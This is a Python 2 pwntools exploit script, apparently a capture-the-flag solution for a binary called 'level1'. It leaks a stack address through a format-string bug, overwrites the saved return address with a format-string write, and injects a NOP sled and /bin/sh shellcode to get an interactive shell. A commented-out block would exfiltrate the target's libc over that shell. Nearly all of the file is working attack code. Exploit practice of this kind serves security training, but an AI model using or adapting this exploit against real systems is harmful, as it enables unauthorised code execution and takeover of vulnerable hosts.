#!/usr/bin/env python2

import base64
from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

b = ELF('level1')
context.log_level = 'info'
# http://shell-storm.org/shellcode/files/shellcode-851.php
SC = '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'

###

if DEBUG:
    r = process('./level1')
else:
    r = remote('127.0.0.1', 1337)

def menu():
    global r
    r.recvuntil('[5] Exit\n')
    r.recvline()

def search(q):
    global r
    r.sendline('3')
    r.recvuntil('query: ')
    r.sendline(q)
    r.recvuntil('Searching with: ')
    data = r.recvline()
    menu()
    return data.rstrip()


def leak(addr):
    global r
    r.sendline('3')
    r.recvuntil('query: ')
    q = '%13$s000' + p32(addr)
    r.sendline(q)
    r.recvuntil('Searching with: ')
    data = r.recvline()
    menu()
    return data.rstrip()[0:4]


menu()
r.sendline('1') # insert book
r.recvuntil('book name: ')
r.sendline('toto')
r.recvuntil('Enter book id: ')
r.sendline('1')
menu()

# leak stack addr
stackLeak = int(search('%p'), 16)
EIP = stackLeak + 0x410
log.info('stackLeak: %#x' % stackLeak)
log.info('EIP: %#x' % EIP)

GDB = False
if GDB and DEBUG:
    gdb.attach(r, '''
    b *0x080487F0
    ''')
context.clear(arch='i386')
write = {EIP:stackLeak + 0x100} # replacing EIP with buffer + 0x100
p  = fmtstr_payload(11, write, numbwritten=0, write_size='short')
p += '\x90' * 0x100
p += SC + '\x00'
r.sendline('3')
r.recvuntil('query: ')
r.sendline(p)

time.sleep(2)
r.recv(4096)

r.interactive()

#r.sendline('cat /lib32/libc.so.6 | base64')
#lib = r.recvall(timeout=10)
#with open('libc.so', 'wb') as f:
#    f.write(base64.b64decode(lib))
